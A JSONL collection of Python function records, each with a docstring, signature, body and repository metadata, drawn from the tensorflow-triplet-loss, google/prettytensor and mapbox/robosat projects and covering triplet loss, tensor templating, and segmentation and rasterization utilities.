{"docstring": "\"\"\"Compute the 2D matrix of distances between all the embeddings.\n\nArgs:\n    embeddings: tensor of shape (batch_size, embed_dim)\n    squared: Boolean. If true, output is the pairwise squared euclidean distance matrix.\n             If false, output is the pairwise euclidean distance matrix.\n\nReturns:\n    pairwise_distances: tensor of shape (batch_size, batch_size)\n\"\"\"\n# Get the dot product between all embeddings\n# shape (batch_size, batch_size)\n", "func_signal": "def _pairwise_distances(embeddings, squared=False):\n", "code": "dot_product = tf.matmul(embeddings, tf.transpose(embeddings))\n\n# Get squared L2 norm for each embedding. We can just take the diagonal of `dot_product`.\n# This also provides more numerical stability (the diagonal of the result will be exactly 0).\n# shape (batch_size,)\nsquare_norm = tf.diag_part(dot_product)\n\n# Compute the pairwise distance matrix as we have:\n# ||a - b||^2 = ||a||^2  - 2 <a, b> + ||b||^2\n# shape (batch_size, batch_size)\ndistances = tf.expand_dims(square_norm, 1) - 2.0 * dot_product + tf.expand_dims(square_norm, 0)\n\n# Because of computation errors, some distances might be negative so we put everything >= 0.0\ndistances = tf.maximum(distances, 0.0)\n\nif not squared:\n    # Because the gradient of sqrt is infinite when distances == 0.0 (ex: on the diagonal)\n    # we need to add a small epsilon where distances == 0.0\n    mask = tf.to_float(tf.equal(distances, 0.0))\n    distances = distances + mask * 1e-16\n\n    distances = tf.sqrt(distances)\n\n    # Correct the epsilon added: set the distances on the mask to be exactly 0.0\n    distances = distances * (1.0 - mask)\n\nreturn distances", "path": "tensorflow-triplet-loss/model/triplet_loss.py", "commit_date": "2018-07-05 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Return a 3D mask where mask[a, p, n] is True iff the triplet (a, p, n) is valid.\n\nA triplet (i, j, k) is valid if:\n    - i, j, k are distinct\n    - labels[i] == labels[j] and labels[i] != labels[k]\n\nArgs:\n    labels: tf.int32 `Tensor` with shape [batch_size]\n\"\"\"\n# Check that i, j and k are distinct\n", "func_signal": "def _get_triplet_mask(labels):\n", "code": "indices_equal = tf.cast(tf.eye(tf.shape(labels)[0]), tf.bool)\nindices_not_equal = tf.logical_not(indices_equal)\ni_not_equal_j = tf.expand_dims(indices_not_equal, 2)\ni_not_equal_k = tf.expand_dims(indices_not_equal, 1)\nj_not_equal_k = tf.expand_dims(indices_not_equal, 0)\n\ndistinct_indices = tf.logical_and(tf.logical_and(i_not_equal_j, i_not_equal_k), j_not_equal_k)\n\n\n# Check if labels[i] == labels[j] and labels[i] != labels[k]\nlabel_equal = tf.equal(tf.expand_dims(labels, 0), tf.expand_dims(labels, 1))\ni_equal_j = tf.expand_dims(label_equal, 2)\ni_equal_k = tf.expand_dims(label_equal, 1)\n\nvalid_labels = tf.logical_and(i_equal_j, tf.logical_not(i_equal_k))\n\n# Combine the two masks\nmask = tf.logical_and(distinct_indices, valid_labels)\n\nreturn mask", "path": "tensorflow-triplet-loss/model/triplet_loss.py", "commit_date": "2018-07-05 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Validate that filename corresponds to images for the MNIST dataset.\"\"\"\n", "func_signal": "def check_image_file_header(filename):\n", "code": "with tf.gfile.Open(filename, 'rb') as f:\n    magic = read32(f)\n    read32(f)  # num_images, unused\n    rows = read32(f)\n    cols = read32(f)\n    if magic != 2051:\n        raise ValueError('Invalid magic number %d in MNIST file %s' % (magic, f.name))\n    if rows != 28 or cols != 28:\n        raise ValueError(\n                'Invalid MNIST file %s: Expected 28x28 images, found %dx%d' %\n                (f.name, rows, cols))", "path": "tensorflow-triplet-loss/model/mnist_dataset.py", "commit_date": "2018-04-02 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Build the triplet loss over a batch of embeddings.\n\nFor each anchor, we get the hardest positive and hardest negative to form a triplet.\n\nArgs:\n    labels: labels of the batch, of size (batch_size,)\n    embeddings: tensor of shape (batch_size, embed_dim)\n    margin: margin for triplet loss\n    squared: Boolean. If true, output is the pairwise squared euclidean distance matrix.\n             If false, output is the pairwise euclidean distance matrix.\n\nReturns:\n    triplet_loss: scalar tensor containing the triplet loss\n\"\"\"\n# Get the pairwise distance matrix\n", "func_signal": "def batch_hard_triplet_loss(labels, embeddings, margin, squared=False):\n", "code": "pairwise_dist = _pairwise_distances(embeddings, squared=squared)\n\n# For each anchor, get the hardest positive\n# First, we need to get a mask for every valid positive (they should have same label)\nmask_anchor_positive = _get_anchor_positive_triplet_mask(labels)\nmask_anchor_positive = tf.to_float(mask_anchor_positive)\n\n# We put to 0 any element where (a, p) is not valid (valid if a != p and label(a) == label(p))\nanchor_positive_dist = tf.multiply(mask_anchor_positive, pairwise_dist)\n\n# shape (batch_size, 1)\nhardest_positive_dist = tf.reduce_max(anchor_positive_dist, axis=1, keepdims=True)\ntf.summary.scalar(\"hardest_positive_dist\", tf.reduce_mean(hardest_positive_dist))\n\n# For each anchor, get the hardest negative\n# First, we need to get a mask for every valid negative (they should have different labels)\nmask_anchor_negative = _get_anchor_negative_triplet_mask(labels)\nmask_anchor_negative = tf.to_float(mask_anchor_negative)\n\n# We add the maximum value in each row to the invalid negatives (label(a) == label(n))\nmax_anchor_negative_dist = tf.reduce_max(pairwise_dist, axis=1, keepdims=True)\nanchor_negative_dist = pairwise_dist + max_anchor_negative_dist * (1.0 - mask_anchor_negative)\n\n# shape (batch_size,)\nhardest_negative_dist = tf.reduce_min(anchor_negative_dist, axis=1, keepdims=True)\ntf.summary.scalar(\"hardest_negative_dist\", tf.reduce_mean(hardest_negative_dist))\n\n# Combine biggest d(a, p) and smallest d(a, n) into final triplet loss\ntriplet_loss = tf.maximum(hardest_positive_dist - hardest_negative_dist + margin, 0.0)\n\n# Get final mean triplet loss\ntriplet_loss = tf.reduce_mean(triplet_loss)\n\nreturn triplet_loss", "path": "tensorflow-triplet-loss/model/triplet_loss.py", "commit_date": "2018-07-05 00:00:00", "repo_name": "omoindrot/tensorflow-triplet-loss", "stars": 1107, "license": "mit", "language": "python", "size": 3281}
{"docstring": "\"\"\"Creates a nested set of name and id scopes and avoids repeats.\"\"\"\n", "func_signal": "def _method_scope(input_layer, name):\n", "code": "global _in_method_scope\n# pylint: disable=protected-access\n\nwith input_layer.g.as_default(), \\\n     scopes.var_and_name_scope(\n         None if _in_method_scope else input_layer._scope), \\\n     scopes.var_and_name_scope((name, None)) as (scope, var_scope):\n  was_in_method_scope = _in_method_scope\n  yield scope, var_scope\n  _in_method_scope = was_in_method_scope", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Creates an input layer representing the given sequence of tensors.\n\nArgs:\n  sequence: A sequence of tensors.\n  books: The bookkeeper.\n  tensor_shape: An optional shape that will be set on the Tensor or verified\n    to match the tensor.\nReturns:\n  A layer.\n\"\"\"\n", "func_signal": "def wrap_sequence(sequence, books=None, tensor_shape=None):\n", "code": "if books is None:\n  books = bookkeeper.for_default_graph()\nmy_sequence = [\n    wrap(t, books=books, tensor_shape=tensor_shape) for t in sequence]\nreturn Layer(books, sequence=my_sequence, name=my_sequence[0].name)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Sets the name scope for future operations.\"\"\"\n", "func_signal": "def with_name(self, name):\n", "code": "self._head = self._head.with_name(name)\nreturn self", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Sets the name scope for future operations.\"\"\"\n", "func_signal": "def with_name(self, name):\n", "code": "with self.g.as_default(), scopes.var_and_name_scope((name, None)) as (\n    name_scope, var_scope):\n  return Layer(copy=self, name=self._name, scope=(name_scope, var_scope))", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Merges src into dst and throws an exception if a value is incompatible.\"\"\"\n", "func_signal": "def _merge_unbound_var_dicts(src, dst):\n", "code": "for k, v in six.iteritems(src):\n  if dst.get(k, v) != v:\n    trace1 = ''.join(scopes.skip_common_stack_elements(v.stacktrace, dst[\n        k].stacktrace))\n    trace2 = ''.join(\n        scopes.skip_common_stack_elements(dst[k].stacktrace, v.stacktrace))\n    raise ValueError('Key conflict: %s\\nDefined At:\\n%s\\nand\\n%s' %\n                     (k, trace1, trace2))\n  else:\n    dst[k] = v", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Assigns values to the vars and raises ValueError if one is missing.\"\"\"\n", "func_signal": "def _assign_values_to_unbound_vars(unbound_vars, unbound_var_values):\n", "code": "context = {}\nfor key, value in six.iteritems(unbound_var_values):\n  if key not in unbound_vars:\n    raise ValueError('unexpected key: %s. Legal values are: %s' %\n                     (key, list(six.iterkeys(unbound_vars))))\n  context[unbound_vars[key]] = value\nunspecified = []\nfor unbound_var in six.itervalues(unbound_vars):\n  if unbound_var not in context:\n    if unbound_var.has_default():\n      context[unbound_var] = unbound_var.default\n    else:\n      unspecified.append(unbound_var.key)\nif unspecified:\n  raise ValueError('Unspecified keys: %s' % unspecified)\nreturn context", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Creates a function by binding the arguments in the given order.\n\nArgs:\n  *binding_order: The unbound variables. This must include all values.\nReturns:\n  A function that takes the arguments of binding_order.\nRaises:\n  ValueError: If the bindings are missing values or include unknown values.\n\"\"\"\n", "func_signal": "def as_fn(self, *binding_order):\n", "code": "if len(binding_order) != len(self._unbound_vars):\n  raise ValueError('All vars must be specified.')\nfor arg in binding_order:\n  if arg not in self._unbound_vars:\n    raise ValueError('Unknown binding: %s' % arg)\n\ndef func(*args, **kwargs):\n  \"\"\"Constructs a template.\"\"\"\n  if len(binding_order) != len(args):\n    raise ValueError('Missing values, expects: %s' % binding_order)\n  values = dict(zip(binding_order, args))\n  values.update(kwargs)\n  return self.construct(**values)\n\nfunc.__doc__ = _gen_ipython_string(func, binding_order, [], func.__doc__)\nreturn func", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Adds a loss and returns a wrapper for that loss.\"\"\"\n", "func_signal": "def add_loss(self, loss, name=None):\n", "code": "self.bookkeeper.add_loss(loss, name=name)\nreturn Loss(self.bookkeeper, tensor=loss, name=name)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Assigns arguments to the decorator.\n\nArgs:\n  assign_defaults: A sequence of strings for the default values that should\n    be provided.\n  method_name: If provided, use this as the method_name instead of the\n    wrapped function's name.\n  overwrite: If False, throw an exception if this method has already been\n    registered.  True should be used in interactive environments or with\n    great care.\n\"\"\"\n", "func_signal": "def __init__(self, assign_defaults=(), method_name=None, overwrite=False):\n", "code": "if isinstance(assign_defaults, str):\n  self._assign_defaults = [assign_defaults]\nelse:\n  self._assign_defaults = assign_defaults\nself._method_name = method_name\nself._overwrite = overwrite\n_valid_defaults.update(self._assign_defaults)\ndefault_args = sorted(_valid_defaults)\ndefault_values = [None] * len(_valid_defaults)\nif six.PY2:\n  default_func = PrettyTensor.with_defaults.__func__\nelse:\n  default_func = PrettyTensor.with_defaults\n_set_ipython_string(default_func, default_args, default_values,\n                    _original_set_defaults_doc)\n_set_ipython_string(defaults_scope, default_args, default_values,\n                    _original_defaults_scope_doc)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Sets the name scope for future operations.\"\"\"\n", "func_signal": "def with_name(self, name):\n", "code": "with self.g.as_default(), tf.variable_scope(name) as var_scope:\n  name_scope = scopes.get_current_name_scope()\n  return _DeferredLayer(self.bookkeeper,\n                        None,\n                        (),\n                        {},\n                        scope=(name_scope, var_scope),\n                        defaults=self._defaults,\n                        pass_through=self,\n                        partial_context=self._partial_context)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Supports not including the parens.\"\"\"\n", "func_signal": "def __new__(cls, *args, **kwargs):\n", "code": "if len(args) == 1 and isinstance(args[0], collections.Callable):\n  assert not kwargs\n  register = super(_RegisterBase, cls).__new__(cls)\n  register.__init__()\n  return register(args[0])\nelse:\n  return super(_RegisterBase, cls).__new__(cls)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Creates the method.\"\"\"\n# pylint: disable=missing-docstring\n", "func_signal": "def create_method(self, func):\n", "code": "@functools.wraps(func)\ndef method(input_layer, *args, **kwargs):\n  return func(input_layer, *args, **self.fill_kwargs(input_layer, kwargs))\n\nreturn method", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Attaches the template to this such that _key=this layer.\n\nNote: names were chosen to avoid conflicts with any likely unbound_var keys.\n\nArgs:\n  _template: The template to construct.\n  _key: The key that this layer should replace.\n  **unbound_var_values: The values for the unbound_vars.\nReturns:\n  A new layer with operation applied.\nRaises:\n  ValueError: If _key is specified twice or there is a problem computing the\n    template.\n\"\"\"\n", "func_signal": "def attach_template(self, _template, _key, **unbound_var_values):\n", "code": "if _key in unbound_var_values:\n  raise ValueError('%s specified twice.' % _key)\nunbound_var_values[_key] = self\nreturn _template.as_layer().construct(**unbound_var_values)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Remove the distracting lines from the stored tracebacks.\n\nThis also reduces memory overhead by removing the frame contents. This is very\nimportant when doing long unrolls.\n\nArgs:\n  result: The result to process.\n  processed: A set of already processed nodes, used to stop early.\n\"\"\"\n# pylint: disable=protected-access\n", "func_signal": "def _strip_unnecessary_contents_from_stack(result, processed):\n", "code": "if isinstance(result, (PrettyTensor, Loss)):\n  if result.is_sequence():\n    for tensor in result.sequence:\n      _strip_unnecessary_contents_from_stack(tensor, processed)\n      return\n  else:\n    result = result.tensor\nif hasattr(result, 'op'):\n  result = result.op\nif result in processed:\n  return\nelse:\n  processed.add(result)\ntrace = []\nfound = False\nfor f, line_no, method, _ in result._traceback:\n  if (method in ('_replace_deferred', '_construct') and\n      f.endswith('pretty_tensor_class.py')):\n    found = True\n    continue\n  trace.append((f, line_no, method, {}))\nresult._traceback = trace\n\n# Assume that if we didn't find any PT deferred lines, then this node is\n# not part of the deferred construction.\nif not found:\n  return\nfor inp in result.inputs:\n  _strip_unnecessary_contents_from_stack(inp, processed)", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Returns the underlying graph element if possible.\"\"\"\n", "func_signal": "def _as_graph_element(self):\n", "code": "if self.is_sequence():\n  raise TypeError('A Pretty Tensor that holds a sequence cannot be '\n                  'represented as a graph element.')\nelse:\n  # Self might be holding something else that isn't a true tensor, so\n  # if the 'tensor' can behave like a graph element, look for its\n  # _AsGraphElement method and call it. Graph elements themselves may not\n  # have or need this method, so just return other items directly.\n  obj = self.tensor\n  conv_fn = getattr(obj, '_as_graph_element', None)\n  if conv_fn and isinstance(conv_fn, collections.Callable):\n    obj = conv_fn()\n  return obj", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Returns the underlying tensor if tensor is wrapped or tensor.\n\nArgs:\n  tensor: The tensor to unwrap.\nReturns:\n  Tensor or if it is a pretty tensor, the unwrapped version.\nRaises:\n  ValueError: if tensor holds a sequence.\n\"\"\"\n", "func_signal": "def unwrap(tensor):\n", "code": "while isinstance(tensor, (PrettyTensor, Loss)):\n  tensor = tensor.tensor\nreturn tensor", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Ensures that the vars line up between the two modes.\"\"\"\n", "func_signal": "def testGraphMatchesImmediate(self):\n", "code": "with tf.Graph().as_default():\n  input_pt = prettytensor.wrap(\n      tf.constant(self.input_data, dtype=tf.float32))\n  self.BuildLargishGraph(input_pt)\n  normal_names = sorted([v.name for v in tf.global_variables()])\n\nwith tf.Graph().as_default():\n  template = prettytensor.template('input')\n  self.BuildLargishGraph(template).construct(input=prettytensor.wrap(\n      tf.constant(self.input_data, dtype=tf.float32)))\n  template_names = sorted([v.name for v in tf.global_variables()])\n\nself.assertSequenceEqual(normal_names, template_names)", "path": "prettytensor/prettytensor/templated_pretty_tensor_test.py", "commit_date": "2016-12-07 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"The same unbound_var can be used multiple times in a graph.\"\"\"\n", "func_signal": "def testUnboundVariableReused(self):\n", "code": "input_pt = self.Wrap(self.input)\nunbound_var = prettytensor.UnboundVariable('width')\ntemplate = (input_pt.flatten().fully_connected(unbound_var)\n            .fully_connected(unbound_var))\nout = self.RunTensor(template.construct(width=200))\nself.assertSequenceEqual([2, 200], out.shape)", "path": "prettytensor/prettytensor/templated_pretty_tensor_test.py", "commit_date": "2016-12-07 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Provides auto-complete hint to ipython.\n\nIf the first line in a docstring is fn(arg1=, arg2=) then they are added to\nauto-complete.  This cannot be called on an instance method.\n\nArgs:\n  func: The function that will be modified.\n  args: The arguments that this function takes in order.\n  defaults: The default arguments corresponding the last arguments.\n  original_doc: Original docstring to assign after the magic string.\nReturns:\n  The new doc string with the magic bit prepended.\n\"\"\"\n", "func_signal": "def _gen_ipython_string(func, args, defaults, original_doc):\n", "code": "magic_string = '%s(' % func.__name__\n\nif defaults:\n  default_offset = len(args) - len(defaults)\nelse:\n  default_offset = len(args)\nfor i, value in enumerate(args):\n  if i >= default_offset:\n    magic_string += '%s=%s, ' % (value, defaults[i - default_offset])\n  else:\n    magic_string += '%s, ' % value\nif args:\n  magic_string = magic_string[:-2]\nmagic_string += ')\\n\\n'\nif original_doc is not None:\n  magic_string += original_doc\nreturn magic_string", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"Called after an extention method with the result.\"\"\"\n", "func_signal": "def _method_complete(self, result):\n", "code": "if isinstance(result, PrettyTensor):\n  self._head = result\n  return self\nelif isinstance(result, Loss):\n  return result\nelif isinstance(result, PrettyTensorTupleMixin):\n  self._head = result[0]\n  return result\nelse:\n  self._head = self._head.with_tensor(result)\n  return self", "path": "prettytensor/prettytensor/pretty_tensor_class.py", "commit_date": "2017-02-01 00:00:00", "repo_name": "google/prettytensor", "stars": 1239, "license": "None", "language": "python", "size": 525}
{"docstring": "\"\"\"The networks forward pass for which autograd synthesizes the backwards pass.\n\nArgs:\n  x: the input tensor\n\nReturns:\n  The networks output tensor.\n\"\"\"\n", "func_signal": "def forward(self, x):\n", "code": "size = x.size()\nassert size[-1] % 32 == 0 and size[-2] % 32 == 0, \"image resolution has to be divisible by 32 for resnet\"\n\nenc0 = self.resnet.conv1(x)\nenc0 = self.resnet.bn1(enc0)\nenc0 = self.resnet.relu(enc0)\nenc0 = self.resnet.maxpool(enc0)\n\nenc1 = self.resnet.layer1(enc0)\nenc2 = self.resnet.layer2(enc1)\nenc3 = self.resnet.layer3(enc2)\nenc4 = self.resnet.layer4(enc3)\n\ncenter = self.center(nn.functional.max_pool2d(enc4, kernel_size=2, stride=2))\n\ndec0 = self.dec0(torch.cat([enc4, center], dim=1))\ndec1 = self.dec1(torch.cat([enc3, dec0], dim=1))\ndec2 = self.dec2(torch.cat([enc2, dec1], dim=1))\ndec3 = self.dec3(torch.cat([enc1, dec2], dim=1))\ndec4 = self.dec4(dec3)\ndec5 = self.dec5(dec4)\n\nreturn self.final(dec5)", "path": "robosat/robosat/unet.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Creates an `JointTransform` instance.\n\nArgs:\n  image_transform: the transformation to run on the images or `None` for no-op.\n  mask_transform: the transformation to run on the mask or `None` for no-op.\n\nReturns:\n  The (images, mask) tuple with the transformations applied.\n\"\"\"\n\n", "func_signal": "def __init__(self, image_transform, mask_transform):\n", "code": "self.image_transform = image_transform\nself.mask_transform = mask_transform", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "# Note: assumes binary case and probability sums up to one.\n# Needs to be in sync with how we store them in prediction.\n\n", "func_signal": "def load(path):\n", "code": "quantized = np.array(Image.open(path).convert(\"P\"))\n\n# (512, 512, 1) -> (1, 512, 512)\nforeground = np.rollaxis(np.expand_dims(anchors[quantized], axis=0), axis=0)\nbackground = np.rollaxis(1. - foreground, axis=0)\n\n# (1, 512, 512) + (1, 512, 512) -> (2, 512, 512)\nreturn np.concatenate((background, foreground), axis=0)", "path": "robosat/robosat/tools/masks.py", "commit_date": "2018-06-27 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Applies the transformations associated with images and their mask.\n\nArgs:\n  images: the PIL.Image images to transform.\n  mask: the PIL.Image mask to transform.\n\nReturns:\n  The PIL.Image (images, mask) tuple with images and mask transformed.\n\"\"\"\n\n", "func_signal": "def __call__(self, images, mask):\n", "code": "if self.image_transform is not None:\n    images = [self.image_transform(v) for v in images]\n\nif self.mask_transform is not None:\n    mask = self.mask_transform(mask)\n\nreturn images, mask", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Creates a `DecoderBlock` building block.\n\nArgs:\n  num_in: number of input feature maps\n  num_out: number of output feature maps\n\"\"\"\n\n", "func_signal": "def __init__(self, num_in, num_out):\n", "code": "super().__init__()\n\nself.block = ConvRelu(num_in, num_out)", "path": "robosat/robosat/unet.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Creates a binary mask for contours.\n\nArgs:\n  contours: the contours to create a mask for.\n  shape: the resulting mask's shape\n\nReturns:\n  The binary mask with rasterized contours.\n\"\"\"\n\n", "func_signal": "def contours_to_mask(contours, shape):\n", "code": "canvas = np.zeros(shape, np.uint8)\ncv2.drawContours(canvas, contours, contourIdx=-1, color=1)\nreturn canvas", "path": "robosat/robosat/features/core.py", "commit_date": "2019-09-14 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Removes noise from a mask.\n\nArgs:\n  mask: the mask to remove noise from.\n  eps: the morphological operation's kernel size for noise removal, in pixel.\n\nReturns:\n  The mask after applying denoising.\n\"\"\"\n\n", "func_signal": "def denoise(mask, eps):\n", "code": "struct = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (eps, eps))\nreturn cv2.morphologyEx(mask, cv2.MORPH_OPEN, struct)", "path": "robosat/robosat/features/core.py", "commit_date": "2019-09-14 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Walks a hierarchy tree upwards from a starting node collecting all nodes on the way.\n\nArgs:\n  node: the index for the starting node in the hierarchy.\n  tree: the hierarchy tree containing tuples of (next, prev, first child, parent) ids.\n\nYields:\n  The node ids on the upwards path in the hierarchy tree.\n\"\"\"\n\n", "func_signal": "def parents_in_hierarchy(node, tree):\n", "code": "def parent(n):\n    # next, prev, fst child, parent\n    return n[3]\n\nat = tree[node]\nup = parent(at)\n\nwhile up != -1:\n    index = up\n    at = tree[index]\n    up = parent(at)\n\n    assert index != node, \"upward path does not include starting node\"\n\n    yield index", "path": "robosat/robosat/features/core.py", "commit_date": "2019-09-14 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Randomly rotates images and their mask.\n\nArgs:\n  images: the PIL.Image image to transform.\n  mask: the PIL.Image mask to transform.\n\nReturns:\n  The PIL.Image (images, mask) tuple with either images and mask rotated or none of them rotated.\n\"\"\"\n\n", "func_signal": "def __call__(self, images, mask):\n", "code": "if random.random() < self.p:\n    return [v.transpose(self.method) for v in images], mask.transpose(self.method)\nelse:\n    return images, mask", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"\nArgs:\n  root: the slippy map directory root with a `z/x/y.png` sub-structure.\n  transform: the transformation to run on the buffered tile.\n  size: the Slippy Map tile size in pixels\n  overlap: the tile border to add on every side; in pixel.\n\nNote:\n  The overlap must not span multiple tiles.\n\n  Use `unbuffer` to get back the original tile.\n\"\"\"\n\n", "func_signal": "def __init__(self, root, transform=None, size=512, overlap=32):\n", "code": "super().__init__()\n\nassert overlap >= 0\nassert size >= 256\n\nself.transform = transform\nself.size = size\nself.overlap = overlap\nself.tiles = list(tiles_from_slippy_map(root))", "path": "robosat/robosat/datasets.py", "commit_date": "2018-08-08 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Applies multiple transformations to the images and the mask at the same time.\n\nArgs:\n  images: the PIL.Image images to transform.\n  mask: the PIL.Image mask to transform.\n\nReturns:\n  The transformed PIL.Image (images, mask) tuple.\n\"\"\"\n\n", "func_signal": "def __call__(self, images, mask):\n", "code": "for transform in self.transforms:\n    images, mask = transform(images, mask)\n\nreturn images, mask", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Randomly flips image and their mask left to right.\n\nArgs:\n  images: the PIL.Image images to transform.\n  mask: the PIL.Image mask to transform.\n\nReturns:\n  The PIL.Image (images, mask) tuple with either images and mask flipped or none of them flipped.\n\"\"\"\n\n", "func_signal": "def __call__(self, images, mask):\n", "code": "if random.random() < self.p:\n    return [v.transpose(Image.FLIP_LEFT_RIGHT) for v in images], mask.transpose(Image.FLIP_LEFT_RIGHT)\nelse:\n    return images, mask", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Randomly flips images and their mask top to bottom.\n\nArgs:\n  images: the PIL.Image image to transform.\n  mask: the PIL.Image mask to transform.\n\nReturns:\n  The PIL.Image (images, mask) tuple with either images and mask flipped or none of them flipped.\n\"\"\"\n\n", "func_signal": "def __call__(self, images, mask):\n", "code": "if random.random() < self.p:\n    return [v.transpose(Image.FLIP_TOP_BOTTOM) for v in images], mask.transpose(Image.FLIP_TOP_BOTTOM)\nelse:\n    return images, mask", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Burn tile with features.\n\nArgs:\n  tile: the mercantile tile to burn.\n  features: the geojson features to burn.\n  size: the size of burned image.\n\nReturns:\n  image: rasterized file of size with features burned.\n\"\"\"\n\n# the value you want in the output raster where a shape exists\n", "func_signal": "def burn(tile, features, size):\n", "code": "burnval = 1\nshapes = ((geometry, burnval) for feature in features for geometry in feature_to_mercator(feature))\n\nbounds = mercantile.xy_bounds(tile)\ntransform = from_bounds(*bounds, size, size)\n\nreturn rasterize(shapes, out_shape=(size, size), transform=transform)", "path": "robosat/robosat/tools/rasterize.py", "commit_date": "2018-10-24 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
